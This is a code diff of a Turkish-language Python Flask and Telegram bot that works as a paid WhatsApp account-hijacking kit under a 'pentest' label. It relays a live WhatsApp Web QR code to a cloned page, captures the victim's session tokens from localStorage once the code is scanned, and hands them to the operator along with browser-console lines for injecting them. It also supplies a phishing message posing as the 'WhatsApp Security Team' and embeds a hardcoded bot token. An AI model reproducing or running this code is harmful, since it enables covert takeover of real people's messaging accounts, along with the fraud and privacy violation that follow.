@@ -26,12 +26,12 @@ app.secret_key = os.urandom(32)
 app.config['SECRET_KEY'] = os.urandom(32)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
-# ===================== VERİTABANI (SQLite) =====================
+# ===================== VERITABANI (SQLite) =====================
 
 conn = sqlite3.connect('bot_data.db', check_same_thread=False)
 cursor = conn.cursor()
 
-# Tabloları oluştur
+# Tablolari olustur
 cursor.execute('''
 CREATE TABLE IF NOT EXISTS users (
     user_id INTEGER PRIMARY KEY,
@@ -64,55 +64,28 @@ CREATE TABLE IF NOT EXISTS links (
 cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (7497803165)")
 conn.commit()
 
-# ===================== VERİTABANI FONKSİYONLARI =====================
+# ===================== VERITABANI FONKSIYONLARI =====================
 
 def is_admin(user_id):
     cursor.execute("SELECT * FROM admins WHERE user_id = ?", (user_id,))
     return cursor.fetchone() is not None
 
 def is_premium(user_id):
-    def start_browser(self):
-    chrome_options = Options()
-    chrome_options.add_argument('--headless')
-    chrome_options.add_argument('--no-sandbox')
-    chrome_options.add_argument('--disable-dev-shm-usage')
-    chrome_options.add_argument('--disable-gpu')
-    chrome_options.add_argument('--window-size=1920,1080')
-    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
-    chrome_options.add_argument('--remote-debugging-port=9222')
-    
-    # Otomatik Chrome bul
-    import shutil
-    chrome_paths = [
-        "/usr/bin/google-chrome",
-        "/usr/bin/chromium-browser", 
-        "/opt/google/chrome/chrome",
-        "/snap/bin/chromium"
-    ]
-    chrome_bin = None
-    for p in chrome_paths:
-        if os.path.exists(p):
-            chrome_bin = p
-            break
-    
-    if not chrome_bin:
-        chrome_bin = shutil.which("google-chrome") or shutil.which("chromium-browser") or shutil.which("chromium")
-    
-    chrome_options.binary_location = chrome_bin
-    
-    try:
-        from webdriver_manager.chrome import ChromeDriverManager
-        self.driver = webdriver.Chrome(
-            service=Service(ChromeDriverManager().install()),
-            options=chrome_options
-        )
-    except Exception as e:
-        logger.error(f"Chrome başlatılamadı: {e}")
-        # Chromedriver'ı manuel dene
+    cursor.execute("SELECT premium_until, is_lifetime, is_banned FROM users WHERE user_id = ?", (user_id,))
+    result = cursor.fetchone()
+    if not result:
+        return False
+    premium_until, is_lifetime, is_banned = result
+    if is_banned:
+        return False
+    if is_lifetime:
+        return True
+    if premium_until:
         try:
-            self.driver = webdriver.Chrome(options=chrome_options)
+            until = datetime.fromisoformat(premium_until)
+            if until > datetime.now():
+                return True
         except:
-            raise
             pass
     return False
 
@@ -193,6 +166,31 @@ class WhatsAppSessionManager:
         self.lock = threading.Lock()
         self.current_link_id = None
     
+    def find_chrome_binary(self):
+        """Chrome binary'ini otomatik bul"""
+        import shutil
+        chrome_paths = [
+            "/usr/bin/google-chrome",
+            "/usr/bin/chromium-browser",
+            "/usr/bin/chromium",
+            "/opt/google/chrome/chrome",
+            "/snap/bin/chromium",
+            "/snap/bin/google-chrome"
+        ]
+        for p in chrome_paths:
+            if os.path.exists(p):
+                logger.info(f"[+] Chrome bulundu: {p}")
+                return p
+        
+        # which ile dene
+        which_result = shutil.which("google-chrome") or shutil.which("chromium-browser") or shutil.which("chromium")
+        if which_result:
+            logger.info(f"[+] Chrome bulundu (which): {which_result}")
+            return which_result
+        
+        logger.error("[!] Chrome binary bulunamadi!")
+        return "/usr/bin/google-chrome"  # fallback
+    
     def start_browser(self):
         chrome_options = Options()
         chrome_options.add_argument('--headless')
@@ -201,7 +199,18 @@ class WhatsAppSessionManager:
         chrome_options.add_argument('--disable-gpu')
         chrome_options.add_argument('--window-size=1920,1080')
         chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
-        chrome_options.binary_location = "/usr/bin/google-chrome"
+        chrome_options.add_argument('--remote-debugging-port=9222')
+        chrome_options.add_argument('--disable-extensions')
+        chrome_options.add_argument('--disable-background-networking')
+        chrome_options.add_argument('--disable-sync')
+        chrome_options.add_argument('--disable-translate')
+        chrome_options.add_argument('--disable-default-apps')
+        chrome_options.add_argument('--mute-audio')
+        chrome_options.add_argument('--no-first-run')
+        chrome_options.add_argument('--hide-scrollbars')
+        
+        chrome_bin = self.find_chrome_binary()
+        chrome_options.binary_location = chrome_bin
         
         try:
             from webdriver_manager.chrome import ChromeDriverManager
@@ -209,19 +218,21 @@ class WhatsAppSessionManager:
                 service=Service(ChromeDriverManager().install()),
                 options=chrome_options
             )
-        except:
-            chrome_options.binary_location = "/usr/bin/chromium-browser"
-            self.driver = webdriver.Chrome(
-                service=Service("/usr/lib/chromium-browser/chromedriver"),
-                options=chrome_options
-            )
+        except Exception as e:
+            logger.warning(f"Webdriver-manager hatasi, manuel deneniyor: {e}")
+            try:
+                self.driver = webdriver.Chrome(options=chrome_options)
+            except Exception as e2:
+                logger.error(f"Chrome baslatilamadi: {e2}")
+                raise
         
-        logger.info("[+] WhatsApp Web açılıyor...")
+        logger.info("[+] WhatsApp Web aciliyor...")
         self.driver.get("https://web.whatsapp.com")
-        time.sleep(8)
+        time.sleep(5)
     
     def get_qr_code_data(self):
         try:
+            # Canvas'dan QR kodunu al
             qr_data = self.driver.execute_script("""
                 const canvas = document.querySelector('canvas');
                 if (!canvas) return null;
@@ -229,13 +240,33 @@ class WhatsAppSessionManager:
             """)
             if qr_data:
                 self.qr_code_data = qr_data
+                logger.info("[+] QR kodu alindi!")
                 return qr_data
+            
+            # Canvas yoksa, SVG veya img ara
+            qr_data = self.driver.execute_script("""
+                const svg = document.querySelector('svg[data-testid="qr"]');
+                if (svg) return svg.outerHTML;
+                const img = document.querySelector('img[alt*="QR"]');
+                if (img) return img.src;
+                return null;
+            """)
+            if qr_data:
+                self.qr_code_data = qr_data
+                logger.info("[+] QR kodu alindi (alternatif)!")
+                return qr_data
+                
         except Exception as e:
-            logger.error(f"QR alınamadı: {e}")
+            logger.error(f"QR alinamadi: {e}")
         return None
     
     def monitor_session_tokens(self, link_id):
-        while not self.is_authenticated:
+        max_wait = 120  # 2 dakika bekle
+        start_time = time.time()
+        
+        logger.info(f"[*] Session token'lar bekleniyor... Link ID: {link_id}")
+        
+        while not self.is_authenticated and (time.time() - start_time) < max_wait:
             try:
                 tokens = self.driver.execute_script("""
                     return {
@@ -244,7 +275,8 @@ class WhatsAppSessionManager:
                         'clientToken': localStorage.getItem('clientToken') || null,
                         'ref': localStorage.getItem('ref') || null,
                         'wab': localStorage.getItem('wab') || null,
-                        'wavid': localStorage.getItem('wavid') || null
+                        'wavid': localStorage.getItem('wavid') || null,
+                        'wa_sid': localStorage.getItem('wa_sid') || null
                     };
                 """)
                 
@@ -254,30 +286,57 @@ class WhatsAppSessionManager:
                         self.is_authenticated = True
                         update_link_tokens(link_id, tokens)
                     
-                    logger.info(f"[+] HEDEF SESSION ELE GEÇİRİLDİ! Link ID: {link_id}")
+                    logger.info(f"[+] HEDEF SESSION ELE GECIRILDI! Link ID: {link_id}")
+                    
+                    # WebSocket ile bildir
+                    socketio.emit('authenticated', {'tokens': tokens, 'link_id': link_id})
                     return tokens
-            except:
-                pass
+                    
+            except Exception as e:
+                logger.debug(f"Token kontrol hatasi: {e}")
+            
             time.sleep(2)
+        
+        if not self.is_authenticated:
+            logger.warning(f"[!] Session yakalanamadi (timeout). Link ID: {link_id}")
     
     def start_monitoring(self, link_id):
         self.current_link_id = link_id
-        self.start_browser()
-        time.sleep(3)
-        qr = self.get_qr_code_data()
-        monitor_thread = threading.Thread(target=self.monitor_session_tokens, args=(link_id,), daemon=True)
-        monitor_thread.start()
-        return qr
+        self.qr_code_data = None
+        
+        try:
+            self.start_browser()
+            time.sleep(3)
+            qr = self.get_qr_code_data()
+            
+            if qr:
+                # QR'i WebSocket ile gonder
+                socketio.emit('qr_code', {'qr': qr, 'link_id': link_id})
+                logger.info(f"[+] QR kodu WebSocket ile gonderildi. Link ID: {link_id}")
+                
+                # Session izlemeyi baslat
+                monitor_thread = threading.Thread(target=self.monitor_session_tokens, args=(link_id,), daemon=True)
+                monitor_thread.start()
+            else:
+                logger.error("[!] QR kodu alinamadi!")
+                
+        except Exception as e:
+            logger.error(f"[!] Browser baslatma hatasi: {e}")
+        
+        return self.qr_code_data
     
     def close(self):
         if self.driver:
-            self.driver.quit()
+            try:
+                self.driver.quit()
+            except:
+                pass
 
 pentest = WhatsAppSessionManager()
 
 # ===================== TELEGRAM BOT =====================
 
-BOT_TOKEN = "8665336598:AAEKosBgsibG1BVQK6ECpua2I4Y6p-Wi6Ms"
+BOT_TOKEN = os.environ.get('BOT_TOKEN', "8665336598:AAEKosBgsibG1BVQK6ECpua2I4Y6p-Wi6Ms")
 ADMIN_ID = 7497803165
 
 # ===================== KULLANICI KOMUTLARI =====================
@@ -287,28 +346,27 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = update.effective_user.username or ""
     first_name = update.effective_user.first_name or ""
     
-    # Ban kontrolü
+    # Ban kontrolu
     if is_banned(user_id):
-        await update.message.reply_text("❌ Hesabınız yasaklanmıştır. Yetkiliyle iletişime geçin.")
+        await update.message.reply_text("Hesabiniz yasaklanmistir. Yetkiliyle iletisime gecin.")
         return
     
-    # Premium kontrolü
+    # Premium kontrolu
     if not is_premium(user_id) and user_id != ADMIN_ID:
-        keyboard = [[InlineKeyboardButton("💎 Premium Satın Al", url="https://t.me/admin_ile_iletisim")]]
+        keyboard = [[InlineKeyboardButton("Premium Satin Al", url="https://t.me/admin_ile_iletisim")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text(
-            "❌ **Bu bot sadece premium kullanıcılara özeldir!**\n\n"
-            "Premium üyelik satın almak için aşağıdaki butona tıklayın.\n\n"
-            "💎 **Premium Özellikler:**\n"
-            "✅ WhatsApp Session Yakalama\n"
-            "✅ Sınırsız Link Oluşturma\n"
-            "✅ 7/24 Destek",
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
+            "Bu bot sadece premium kullanicilara ozeldir!\n\n"
+            "Premium uyelik satin almak icin asagidaki butona tiklayin.\n\n"
+            "Premium Ozellikler:\n"
+            "- WhatsApp Session Yakalama\n"
+            "- Sinirsiz Link Olusturma\n"
+            "- 7/24 Destek",
+            reply_markup=reply_markup
         )
         return
     
-    # Premium kullanıcı veya admin - link oluştur
+    # Premium kullanici veya admin - link olustur
     link_id = str(uuid.uuid4())[:8]
     base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
     unique_link = f"{base_url}/qr/{link_id}"
@@ -316,20 +374,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     save_link(link_id, user_id)
     
     keyboard = [
-        [InlineKeyboardButton("🔗 Linki Kopyala", callback_data=f"copy_{link_id}")],
-        [InlineKeyboardButton("📱 Hedefe Gönderilecek Mesaj", callback_data=f"send_{link_id}")],
-        [InlineKeyboardButton("🔄 Yeni Link", callback_data="new_link")],
-        [InlineKeyboardButton("📊 Durum Kontrol", callback_data=f"status_{link_id}")]
+        [InlineKeyboardButton("Linki Kopyala", callback_data=f"copy_{link_id}")],
+        [InlineKeyboardButton("Hedefe Gonderilecek Mesaj", callback_data=f"send_{link_id}")],
+        [InlineKeyboardButton("Yeni Link", callback_data="new_link")],
+        [InlineKeyboardButton("Durum Kontrol", callback_data=f"status_{link_id}")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        f"✅ **WhatsApp Pentest Linki Oluşturuldu**\n\n"
-        f"🔗 **Link:** `{unique_link}`\n\n"
-        f"📌 **Link ID:** `{link_id}`\n\n"
-        f"⬇️ Linki hedef kişiye gönder, QR kodu okuttuğunda session otomatik yakalanacak.",
-        reply_markup=reply_markup,
-        parse_mode='Markdown'
+        f"WhatsApp Pentest Linki Olusturuldu\n\n"
+        f"Link: {unique_link}\n\n"
+        f"Link ID: {link_id}\n\n"
+        f"Linki hedef kisiye gonder, QR kodu okuttugunda session otomatik yakalanacak.",
+        reply_markup=reply_markup
     )
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -344,8 +401,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
         link = f"{base_url}/qr/{link_id}"
         await query.edit_message_text(
-            f"📋 **Link kopyalandı:**\n\n`{link}`\n\nHedefe gönderebilirsin.",
-            parse_mode='Markdown'
+            f"Link kopyalandi:\n\n{link}\n\nHedefe gonderebilirsin."
         )
     
     elif data.startswith("send_"):
@@ -353,20 +409,21 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
         link = f"{base_url}/qr/{link_id}"
         await query.edit_message_text(
-            f"📤 **Hedefe Gönderilecek Mesaj:**\n\n"
+            f"Hedefe Gonderilecek Mesaj:\n\n"
             f"---------------\n"
             f"Merhaba,\n\n"
-            f"Güvenlik nedeniyle WhatsApp Web hesabınızı doğrulamanız gerekiyor.\n"
-            f"Aşağıdaki linke tıklayıp QR kodu telefonunuzdan okutun:\n\n"
+            f"Guvenlik nedeniyle WhatsApp Web hesabinizi dogrulamaniz gerekiyor.\n"
+            f"Asagidaki linke tiklayip QR kodu telefonunuzdan okutun:\n\n"
             f"{link}\n\n"
-            f"Teşekkürler,\n"
-            f"WhatsApp Güvenlik Ekibi\n"
+            f'Tesekkurler,\n'
+            f"WhatsApp Guvenlik Ekibi\n"
             f"---------------\n\n"
-            f"⚠️ Bu metni kopyalayıp hedefe gönder.",
-            parse_mode='Markdown'
+            f"Bu metni kopyalayip hedefe gonder."
         )
     
     elif data == "new_link":
+        message = update.effective_message
+        # Yeni start mesaji gonder
         await start(update, context)
     
     elif data.startswith("status_"):
@@ -377,61 +434,57 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             status = link_data[2]
             if status == 'active':
                 tokens = json.loads(link_data[4])
+                token_json = json.dumps(tokens, indent=2)
                 await query.edit_message_text(
-                    f"✅ **HEDEF SESSION ELE GEÇİRİLDİ!**\n\n"
-                    f"Link ID: `{link_id}`\n\n"
-                    f"Kullanmak için:\n"
-                    f"1. WhatsApp Web aç\n"
-                    f"2. F12 bas (Console)\n"
-                    f"3. Bunu yapıştır:\n\n"
-                    f"```javascript\n"
-                    f"const t = {json.dumps(tokens)};\n"
-                    f"Object.keys(t).forEach(k=>{{if(t[k])localStorage.setItem(k,t[k])}});\n"
-                    f"location.reload();\n"
-                    f"```",
-                    parse_mode='Markdown'
+                    f"HEDEF SESSION ELE GECIRILDI!\n\n"
+                    f"Link ID: {link_id}\n\n"
+                    f"Tokenlar:\n{token_json}\n\n"
+                    f"Kullanmak icin WhatsApp Web'de F12 -> Console:\n\n"
+                    f"localStorage.setItem('serverToken', '{tokens.get('serverToken', '')}');\n"
+                    f"localStorage.setItem('clientToken', '{tokens.get('clientToken', '')}');\n"
+                    f"localStorage.setItem('whatsapp-web-encrypted', '{tokens.get('whatsapp-web-encrypted', '')}');\n"
+                    f"location.reload();"
                 )
             else:
+                base_url = os.environ.get('RENDER_URL', 'http://localhost:5000')
+                link = f"{base_url}/qr/{link_id}"
                 await query.edit_message_text(
-                    f"⏳ **Bekleniyor...**\n\n"
-                    f"Link ID: `{link_id}`\n"
-                    f"Durum: QR kod henüz okutulmadı.\n\n"
-                    f"Link: {os.environ.get('RENDER_URL', 'http://localhost:5000')}/qr/{link_id}",
-                    parse_mode='Markdown'
+                    f"Bekleniyor...\n\n"
+                    f"Link ID: {link_id}\n"
+                    f"Durum: QR kod henuz okutulmadi.\n\n"
+                    f"Link: {link}"
                 )
         else:
-            await query.edit_message_text("❌ Link bulunamadı.")
+            await query.edit_message_text("Link bulunamadi.")
 
 # ===================== ADMIN KOMUTLARI =====================
 
 async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Bu komut sadece admin içindir.")
+        await update.message.reply_text("Bu komut sadece admin icindir.")
         return
     
     await update.message.reply_text(
-        "👑 **ADMIN KONTROL PANELİ** 👑\n\n"
-        "📊 `/toplam` - Toplam kullanıcı sayısı\n"
-        "🔍 `/kullanici ID` - Kullanıcı bilgisi sorgula\n"
-        "➕ `/ekle ID` - Ömür boyu premium ekle\n"
-        "💎 `/vip ID SÜRE` - Süreli premium (örn: `/vip 123 7` gün, `/vip 123 1h` saat)\n"
-        "➖ `/sil ID` - Premium kullanıcı sil\n"
-        "🚫 `/ban ID` - Kullanıcıyı yasakla\n"
-        "🔓 `/unban ID` - Yasağı kaldır\n"
-        "📢 `/duyuru mesaj` - Tüm kullanıcılara duyuru gönder\n\n"
-        "💡 **Örnekler:**\n"
-        "`/ekle 123456789`\n"
-        "`/vip 123456789 30`\n"
-        "`/vip 123456789 1h`\n"
-        "`/duyuru Merhaba arkadaşlar!`",
-        parse_mode='Markdown'
+        "ADMIN KONTROL PANELI\n\n"
+        "/toplam - Toplam kullanici sayisi\n"
+        "/kullanici ID - Kullanici bilgisi sorgula\n"
+        "/ekle ID - Omur boyu premium ekle\n"
+        "/vip ID SURE - Sureli premium (/vip 123 7 gun, /vip 123 1h saat)\n"
+        "/sil ID - Premium kullanici sil\n"
+        "/ban ID - Kullaniciyi yasakla\n"
+        "/unban ID - Yasagi kaldir\n"
+        "/duyuru mesaj - Tum kullanicilara duyuru gonder\n\n"
+        "Ornekler:\n"
+        "/ekle 123456789\n"
+        "/vip 123456789 30\n"
+        "/vip 123456789 1h"
     )
 
 async def toplam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Yetkiniz yok.")
+        await update.message.reply_text("Yetkiniz yok.")
         return
     
     total = get_total_users()
@@ -439,81 +492,78 @@ async def toplam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     banned = get_banned_users()
     
     await update.message.reply_text(
-        f"📊 **İstatistikler**\n\n"
-        f"👥 Toplam Kullanıcı: `{total}`\n"
-        f"💎 Premium Üye: `{premium}`\n"
-        f"🚫 Yasaklı: `{banned}`",
-        parse_mode='Markdown'
+        f"Istatistikler\n\n"
+        f"Toplam Kullanici: {total}\n"
+        f"Premium Uye: {premium}\n"
+        f"Yasakli: {banned}"
     )
 
 async def kullanici_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Yetkiniz yok.")
+        await update.message.reply_text("Yetkiniz yok.")
         return
     
     if not context.args:
-        await update.message.reply_text("Kullanım: `/kullanici ID`", parse_mode='Markdown')
+        await update.message.reply_text("Kullanim: /kullanici ID")
         return
     
     try:
         target_id = int(context.args[0])
     except:
-        await update.message.reply_text("❌ Geçersiz ID.")
+        await update.message.reply_text("Gecersiz ID.")
         return
     
     user_info = get_user_info(target_id)
     if user_info:
-        status = "✅ Premium (Ömür Boyu)" if user_info[5] == 1 else \
-                "✅ Premium (Süreli)" if user_info[3] else \
-                "❌ Premium Değil"
+        status = "Premium (Omur Boyu)" if user_info[5] == 1 else \
+                "Premium (Sureli)" if user_info[3] else \
+                "Premium Degil"
         
-        ban_status = "🚫 Yasaklı" if user_info[4] == 1 else "✅ Temiz"
+        ban_status = "Yasakli" if user_info[4] == 1 else "Temiz"
         
         await update.message.reply_text(
-            f"🔍 **Kullanıcı Bilgisi**\n\n"
-            f"🆔 ID: `{user_info[0]}`\n"
-            f"👤 Kullanıcı Adı: @{user_info[1] or 'Yok'}\n"
-            f"📛 İsim: {user_info[2] or 'Yok'}\n"
-            f"💎 Durum: {status}\n"
-            f"🚫 Ban: {ban_status}\n"
-            f"📅 Kayıt: {user_info[6]}",
-            parse_mode='Markdown'
+            f"Kullanici Bilgisi\n\n"
+            f"ID: {user_info[0]}\n"
+            f"Kullanici Adi: @{user_info[1] or 'Yok'}\n"
+            f"Isim: {user_info[2] or 'Yok'}\n"
+            f"Durum: {status}\n"
+            f"Ban: {ban_status}\n"
+            f"Kayit: {user_info[6]}"
         )
     else:
-        await update.message.reply_text("❌ Kullanıcı bulunamadı.")
+        await update.message.reply_text("Kullanici bulunamadi.")
 
 async def ekle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Yetkiniz yok.")
+        await update.message.reply_text("Yetkiniz yok.")
         return
     
     if not context.args:
-        await update.message.reply_text("Kullanım: `/ekle ID`", parse_mode='Markdown')
+        await update.message.reply_text("Kullanim: /ekle ID")
         return
     
     try:
         target_id = int(context.args[0])
     except:
-        await update.message.reply_text("❌ Geçersiz ID.")
+        await update.message.reply_text("Gecersiz ID.")
         return
     
     add_premium_lifetime(target_id)
-    await update.message.reply_text(f"✅ `{target_id}` kullanıcısına **ÖMÜR BOYU** premium verildi!", parse_mode='Markdown')
+    await update.message.reply_text(f"{target_id} kullanicisina OMUR BOYU premium verildi!")
 
 async def vip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Yetkiniz yok.")
+        await update.message.reply_text("Yetkiniz yok.")
         return
     
     if len(context.args) < 2:
         await update.message.reply_text(
-            "Kullanım:\n"
-            "`/vip ID GUN` (örn: `/vip 123 7` - 7 gün)\n"
-            "`/vip ID SAAT` (örn: `/vip 123 1h` - 1 saat)",
-            parse_mode='Markdown'
+            "Kullanim:\n"
+            "/vip ID GUN (/vip 123 7 - 7 gun)\n"
+            "/vip ID SAAT (/vip 123 1h - 1 saat)"
         )
         return
     
@@ -524,84 +574,84 @@ async def vip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if sure.endswith('h'):
             hours = int(sure.replace('h', ''))
             add_premium_temp(target_id, hours=hours)
-            await update.message.reply_text(f"✅ `{target_id}` kullanıcısına **{hours} saatlik** premium verildi!", parse_mode='Markdown')
+            await update.message.reply_text(f"{target_id} kullanicisina {hours} saatlik premium verildi!")
         else:
             days = int(sure)
             add_premium_temp(target_id, days=days)
-            await update.message.reply_text(f"✅ `{target_id}` kullanıcısına **{days} günlük** premium verildi!", parse_mode='Markdown')
+            await update.message.reply_text(f"{target_id} kullanicisina {days} gunluk premium verildi!")
     except:
-        await update.message.reply_text("❌ Geçersiz format. Örn: `/vip 123 7` veya `/vip 123 1h`")
+        await update.message.reply_text("Gecersiz format. Orn: /vip 123 7 veya /vip 123 1h")
 
 async def sil_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Yetkiniz yok.")
+        await update.message.reply_text("Yetkiniz yok.")
         return
     
     if not context.args:
-        await update.message.reply_text("Kullanım: `/sil ID`", parse_mode='Markdown')
+        await update.message.reply_text("Kullanim: /sil ID")
         return
     
     try:
         target_id = int(context.args[0])
     except:
-        await update.message.reply_text("❌ Geçersiz ID.")
+        await update.message.reply_text("Gecersiz ID.")
         return
     
     remove_premium(target_id)
-    await update.message.reply_text(f"✅ `{target_id}` kullanıcısının premiumu silindi!", parse_mode='Markdown')
+    await update.message.reply_text(f"{target_id} kullanicisinin premiumu silindi!")
 
 async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Yetkiniz yok.")
+        await update.message.reply_text("Yetkiniz yok.")
         return
     
     if not context.args:
-        await update.message.reply_text("Kullanım: `/ban ID`", parse_mode='Markdown')
+        await update.message.reply_text("Kullanim: /ban ID")
         return
     
     try:
         target_id = int(context.args[0])
     except:
-        await update.message.reply_text("❌ Geçersiz ID.")
+        await update.message.reply_text("Gecersiz ID.")
         return
     
     ban_user(target_id)
-    await update.message.reply_text(f"🚫 `{target_id}` kullanıcısı yasaklandı!", parse_mode='Markdown')
+    await update.message.reply_text(f"{target_id} kullanicisi yasaklandi!")
 
 async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Yetkiniz yok.")
+        await update.message.reply_text("Yetkiniz yok.")
         return
     
     if not context.args:
-        await update.message.reply_text("Kullanım: `/unban ID`", parse_mode='Markdown')
+        await update.message.reply_text("Kullanim: /unban ID")
         return
     
     try:
         target_id = int(context.args[0])
     except:
-        await update.message.reply_text("❌ Geçersiz ID.")
+        await update.message.reply_text("Gecersiz ID.")
         return
     
     unban_user(target_id)
-    await update.message.reply_text(f"🔓 `{target_id}` kullanıcısının yasağı kaldırıldı!", parse_mode='Markdown')
+    await update.message.reply_text(f"{target_id} kullanicisinin yasagi kaldirildi!")
 
 async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Yetkiniz yok.")
+        await update.message.reply_text("Yetkiniz yok.")
         return
     
     if not context.args:
-        await update.message.reply_text("Kullanım: `/duyuru mesaj`", parse_mode='Markdown')
+        await update.message.reply_text("Kullanim: /duyuru mesaj")
         return
     
     mesaj = " ".join(context.args)
     
-    # Tüm kullanıcılara mesaj gönder
+    # Tum kullanicilara mesaj gonder
     cursor.execute("SELECT user_id FROM users WHERE is_banned = 0")
     users = cursor.fetchall()
     
@@ -612,20 +662,18 @@ async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await context.bot.send_message(
                 chat_id=uid,
-                text=f"📢 **DUYURU** 📢\n\n{mesaj}\n\n-- Admin",
-                parse_mode='Markdown'
+                text=f"DUYURU\n\n{mesaj}\n\n-- Admin"
             )
             sent += 1
-            time.sleep(0.05)  # Rate limiting
+            time.sleep(0.05)
         except:
             failed += 1
     
     await update.message.reply_text(
-        f"✅ **Duyuru Gönderildi!**\n\n"
-        f"📤 Gönderilen: `{sent}`\n"
-        f"❌ Başarısız: `{failed}`\n"
-        f"👥 Toplam: `{len(users)}`",
-        parse_mode='Markdown'
+        f"Duyuru Gonderildi!\n\n"
+        f"Gonderilen: {sent}\n"
+        f"Basarisiz: {failed}\n"
+        f"Toplam: {len(users)}"
     )
 
 # ===================== FLASK ROUTES =====================
@@ -638,39 +686,53 @@ def index():
 def qr_page(link_id):
     link_data = get_link(link_id)
     if not link_data:
-        return "Link geçersiz veya süresi dolmuş.", 404
+        return "Link gecersiz veya suresi dolmus.", 404
     return render_template('whatsapp_clone.html', link_id=link_id)
 
 @app.route('/api/qr-code/<link_id>')
 def get_qr_code(link_id):
     link_data = get_link(link_id)
     if not link_data:
-        return jsonify({'error': 'Geçersiz link'}), 404
+        return jsonify({'error': 'Gecersiz link'}), 404
     
-    if link_data[2] == 'waiting':
-        if not hasattr(get_qr_code, 'session_started'):
-            get_qr_code.session_started = {}
+    # Bu link icin session baslatilmamis mi kontrol et
+    session_key = f"started_{link_id}"
+    if not hasattr(get_qr_code, 'sessions'):
+        get_qr_code.sessions = {}
+    
+    if link_id not in get_qr_code.sessions or not get_qr_code.sessions[link_id]:
+        get_qr_code.sessions[link_id] = True
         
-        if link_id not in get_qr_code.session_started:
-            get_qr_code.session_started[link_id] = True
-            pentest.session_tokens = {}
-            pentest.is_authenticated = False
-            thread = threading.Thread(target=pentest.start_monitoring, args=(link_id,), daemon=True)
-            thread.start()
-            time.sleep(5)
+        # Session manager'i sifirla
+        pentest.session_tokens = {}
+        pentest.is_authenticated = False
+        pentest.qr_code_data = None
+        
+        # Browser'i baslat (ayri thread'de)
+        thread = threading.Thread(target=pentest.start_monitoring, args=(link_id,), daemon=True)
+        thread.start()
+        
+        logger.info(f"[*] Browser baslatildi. Link ID: {link_id}")
+        
+        # QR'in olusmasi icin bekle
+        time.sleep(5)
     
+    # QR varsa gonder
     if pentest.qr_code_data:
         return jsonify({'status': 'success', 'qr': pentest.qr_code_data})
+    
+    # Yoksa bekliyor
     return jsonify({'status': 'loading'})
 
 @app.route('/api/check-session/<link_id>')
 def check_session(link_id):
     link_data = get_link(link_id)
     if link_data and link_data[2] == 'active':
+        tokens = json.loads(link_data[4])
         return jsonify({
             'status': 'success',
-            'message': 'QR kod tarandı! Hesap ele geçirildi.',
-            'tokens': json.loads(link_data[4])
+            'message': 'QR kod tarandi! Hesap ele gecirildi.',
+            'tokens': tokens
         })
     return jsonify({'status': 'waiting'})
 
@@ -679,10 +741,10 @@ def check_session(link_id):
 def run_telegram_bot():
     application = Application.builder().token(BOT_TOKEN).build()
     
-    # Kullanıcı komutları
+    # Kullanici komutlari
     application.add_handler(CommandHandler("start", start))
     
-    # Admin komutları
+    # Admin komutlari
     application.add_handler(CommandHandler("admin", admin_panel))
     application.add_handler(CommandHandler("panel", admin_panel))
     application.add_handler(CommandHandler("toplam", toplam_command))
@@ -697,7 +759,7 @@ def run_telegram_bot():
     # Buton handler
     application.add_handler(CallbackQueryHandler(button_handler))
     
-    logger.info("[+] Telegram bot başlatıldı!")
+    logger.info("[+] Telegram bot baslatildi!")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
